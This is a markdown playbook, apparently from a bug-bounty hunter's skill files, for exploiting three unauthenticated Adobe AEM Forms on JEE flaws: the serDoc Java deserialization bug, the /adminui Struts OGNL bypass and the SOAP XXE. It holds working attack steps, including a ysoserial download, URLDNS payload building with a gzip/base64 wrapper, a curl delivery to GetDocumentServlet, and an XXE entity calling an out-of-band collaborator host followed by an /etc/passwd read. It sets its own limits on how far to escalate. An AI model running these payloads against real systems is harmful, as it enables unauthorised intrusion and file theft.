# AEM Forms on JEE — APSB25-82, the three genuinely unauthenticated bugs

## Contents

- [Different product, different bulletin](#different-product-different-bulletin)
- [Fingerprint Forms before spending anything here](#fingerprint-forms-before-spending-anything-here)
- [The verified table](#the-verified-table)
- [F1 — CVE-2025-49533 serDoc Java deserialization](#f1--cve-2025-49533--serdoc-java-deserialization)
- [F2 — CVE-2025-54253 /adminui auth bypass + Struts devmode OGNL](#f2--cve-2025-54253--adminui-auth-bypass--struts-devmode-ognl)
- [F3 — CVE-2025-54254 SOAP XXE](#f3--cve-2025-54254--xxe-in-the-soap-authentication-service)
- [Evidence and dedup](#evidence-and-dedup)

## Different product, different bulletin

AEM Forms on JEE is a separate product line from AEM Sites / Cloud Service. It ships
its own bulletin, its own affected range, and — unlike everything in
`apsb25-90-catalog.md` — **three unauthenticated bugs**. Estates frequently co-host
both, so a Sites engagement that turns up `/adminui/` has just gained the more
valuable half of the surface.

**Affected:** AEM Forms on JEE ≤ **6.5.23.0**. Fixed in **6.5.0-0108**, shipped
out-of-band as **APSB25-82** (bulletin date 2025-08-05, per Adobe's advisory page and the Qualys/SecurityWeek coverage of it). AEM as a Cloud Service is not this
product and is not affected.

Verified against NVD and the vendor advisory on 2026-07-26. **Do not add ids to the
table below from memory** — confirm any additional id against NVD or Adobe first and
record where it came from.

## Fingerprint Forms before spending anything here

```bash
H=https://target.example
for p in /adminui/ /adminui/login.jsp /FormServer/ /soap/services/ ; do
  curl -s -o /dev/null -w "%{http_code} %{size_download} $p\n" "$H$p"
done
curl -s "$H/soap/services/" | head -40          # service listing, when exposed
```

`/adminui/`, `/FormServer/`, `/soap/services/`. **A Sites instance has none of
them.** If all three 404, this file does not apply — go back to
`apsb25-90-catalog.md` and get a low-privilege account, which is what that family
needs.

## The verified table

| CVE | CVSS | Bug |
|---|---|---|
| **CVE-2025-49533** | — | Java deserialization in the FormServer `GetDocumentServlet`: the `serDoc` parameter is base64-decoded, gunzipped and deserialized with **no validation**. Unauthenticated RCE. |
| **CVE-2025-54253** | **10.0** | Authentication bypass on the `/adminui` module **combined with Apache Struts left in developer mode**, which exposes OGNL expression evaluation. **Not deserialization.** In **CISA KEV** — actively exploited in the wild. |
| **CVE-2025-54254** | **8.6** | XXE in the SOAP authentication web service, which loads an XML document with external entities enabled. Unauthenticated arbitrary file read. |

**A version match is rung 0 for all three.** `6.5.20` in a banner is not a finding;
the fired oracle against the endpoint is. Two of d0x's own version-fingerprint-only
submissions closed informative with zero bounty
(`../../_shared/references/safe-ladder.md` §"Claiming a CVE").

## F1 — CVE-2025-49533 — `serDoc` Java deserialization

`GetDocumentServlet` base64-decodes, gunzips and calls `readObject()` on `serDoc`
with nothing in between. Unauthenticated RCE.

```
GET /FormServer/servlet/GetDocumentServlet?serDoc=<base64(gzip(java-serialized-bytes))>
```

### Rung 1 — URLDNS, and stop there if it fires

**The safe first move is the `URLDNS` gadget.** It builds a `HashMap` whose key is a
`java.net.URL`; deserializing it calls `hashCode()`, which resolves the hostname.
**It resolves a name and executes nothing** — no command, no file, no process. A DNS
hit alone proves attacker-controlled bytes reached `readObject()`, which *is* the
finding at rung 1. Escalate to a command gadget only if the DNS oracle fires and the
program needs more.

`ysoserial` is **not installed on this host**. From
`../../_shared/references/tooling.md`:

```bash
curl -L -o ~/tools/ysoserial.jar \
  https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar
```

Build the payload and the transport wrapper:

```bash
interactsh-client -v                                    # in another shell -> <id>.<oast-domain>

java -jar ~/tools/ysoserial.jar URLDNS "http://<id>.<oast-domain>" > payload.ser
python3 -c "
import gzip, base64, sys
sys.stdout.write(base64.b64encode(gzip.compress(open('payload.ser','rb').read())).decode())
" > serdoc.txt
```

The wrapper is verified locally against a stand-in file carrying the Java
serialization magic (`ac ed 00 05`), so the pipeline itself is known-good — only the
gadget bytes are missing until `ysoserial` is installed:

```
$ printf '\xac\xed\x00\x05STANDIN-JAVA-SERIALIZED-BYTES' > stand-in.ser
$ python3 -c "import gzip,base64;print(base64.b64encode(gzip.compress(open('stand-in.ser','rb').read())).decode())"
H4sIAGpFZmoC/1vzloE1OMTRz8XTT9fLMcxRN9g1yNPRxzPK1UXXKTLENRgAdzjBBSEAAAA=

$ python3 -c "import gzip,base64;print(base64.b64encode(gzip.compress(open('stand-in.ser','rb').read())).decode())" > stand-in.b64

$ python3 -c "import gzip,base64;print(repr(gzip.decompress(base64.b64decode(open('stand-in.b64').read().strip()))[:8]))"
b'\xac\xed\x00\x05STAN'
```

The round-trip returning the `ac ed 00 05` magic is the check that the wrapper is
correct. (gzip embeds a timestamp, so the base64 string differs run to run — compare
the decoded magic, not the string.)

Send it — **use `--data-urlencode`**:

```bash
curl -s -x 127.0.0.1:8080 -G "$H/FormServer/servlet/GetDocumentServlet" \
     --data-urlencode "serDoc=$(cat serdoc.txt)" -i | head -20
```

A gzip+base64 blob routinely contains `+`, `/` and `=`. In a query string `+` decodes
to a **space**, which silently corrupts the payload and produces a false negative that
looks exactly like a patched target. Verified on the wire here: `--data-urlencode`
sends `/`→`%2f` and `=`→`%3d`, while pasting the blob straight into the URL leaves
them raw.

**Oracle:** a DNS lookup for `<id>.<oast-domain>` arriving at your listener from the
target's resolver, correlated in time with the request. No HTTP request follows —
URLDNS only resolves. That correlation is the proof.

**Negative controls, both worth capturing:** the same request with `serDoc` omitted,
and with `serDoc=` set to base64(gzip(random bytes)) — the second should produce a
deserialization/stream error rather than a lookup, which shows the lookup came from
your gadget and not from ordinary servlet behaviour.

**Escalation** — only if the DNS oracle fired and only per
`../../deserialization-hunting/references/java.md`, which owns gadget selection for
the classpath and the benign-command proof (`id`, `whoami`). One benign read-only
command is the ceiling on production; a shell, persistence or anything beyond that is
out of bounds.

**Converts?** Yes, Critical — unauthenticated RCE with a fired oracle.

## F2 — CVE-2025-54253 — `/adminui` auth bypass + Struts devmode OGNL

**CVSS 10.0.** An authentication bypass on the `/adminui` module, **combined with
Apache Struts left in developer mode**, which exposes OGNL expression evaluation.
Chained, it is unauthenticated RCE. **It is not a deserialization bug** — do not
describe it as one; a triager who sees the mislabel discounts the rest of the report.

**CISA KEV, actively exploited in the wild.** That cuts both ways and you should
decide before you spend the turn:

- The surface is real and the severity is not arguable.
- **Every scanner on the internet fires this, and so does every other hunter.** On a
  well-trafficked program, expect a duplicate. Check the program's own ledger under
  `targets/<program>/reports/` and the corpus first; if the estate is a large brand
  that has been public for months, this is usually already reported. A quiet
  self-hosted estate is where it still converts.
- Because it is actively exploited, the operator may already be compromised. If your
  probe returns evidence of someone else's implant, stop and tell d0x — that is an
  incident notification, not a bounty.

**Oracle:** an **arithmetic OGNL expression evaluating in the response** — the
`${7*7}` → `49` shape, adapted to the Struts devmode parameter the module exposes.
Confirm evaluation and **stop**. On a 10.0 KEV bug a single benign expression is more
than enough proof; a command payload adds no severity and is rung 5.

`../../rce-hunting/references/template-expression.md` owns OGNL confirmation and the
engine-specific escalation ladder — including the Struts2 OGNL forms. Take the
expression syntax from there rather than re-deriving it; the AEM-specific part is
only that the vulnerable module is `/adminui` and that the auth bypass is what puts
you in front of it.

**Converts?** Yes, Critical — **but expect a duplicate.** Grade the estate's exposure
before investing.

## F3 — CVE-2025-54254 — XXE in the SOAP authentication service

**CVSS 8.6.** The SOAP authentication web service loads an XML document with external
entities enabled, unauthenticated. Arbitrary local file read.

**Oracle, in this order:**

1. **Blind OOB first.** A `SYSTEM` entity pointing at your collaborator host inside
   the SOAP body; the callback proves the parser resolves external entities, with
   nothing read.

```xml
<!DOCTYPE x [<!ENTITY e SYSTEM "http://<id>.<oast-domain>/x">]>
```

2. **Then one in-band read** of a non-sensitive file to prove the read reaches the
   filesystem — `/etc/passwd`, `/etc/hostname`, or a build descriptor under the
   application root. **One file.** Do not sweep the filesystem, do not enumerate
   `/proc`, and do not pull application configuration or credentials before the
   report goes in. If the program needs to know that `WEB-INF/config` is readable,
   say so by inference from the one read you did.

`../../ssrf-safe` owns the entity payload forms, the parameter-entity/OOB-exfil
variants and the internal-network reach (`../../ssrf-safe/references/cve-tooling.md` there carries
the XXE→SSRF entry). This file owns only which endpoint is vulnerable.

**Converts?** Yes, High — one proven arbitrary file read on an unauthenticated
endpoint. Critical only if the single file you read is itself credential material,
and in that case the credential is exercised read-only by `../../exposed-secrets`
and *that* becomes the finding.

## Evidence and dedup

Capture for any of the three:

- the **Forms fingerprint** (which of `/adminui/`, `/FormServer/`, `/soap/services/`
  answered, with status and size) and the version, both rung 0;
- the **exact request** and, for F1, the payload-construction commands including the
  round-trip check;
- the **oracle**: the OOB listener log line with its timestamp, or the evaluated
  expression in the response body;
- the **negative control** — the malformed/absent-parameter request that does *not*
  fire it;
- an explicit statement that the request was **unauthenticated** (this family
  genuinely is, unlike `apsb25-90-catalog.md`);
- for F3, which single file was read and that nothing further was pulled.

Dedup before you call it new: `rg -i '<primitive> <host>' ~/Desktop/skills/personal-corpus/h1/index.md ~/Desktop/skills/personal-corpus/bugcrowd/index.md`, and — when the program has one — its live ledger under `targets/<program>/reports/`, which wins over any stale export. A match on the same primitive + same host is CLOSED: rotate to the next angle. **CVE-2025-54253 in particular is mass-exploited: be first or skip.**

Then `validation`, then `report-writing`.
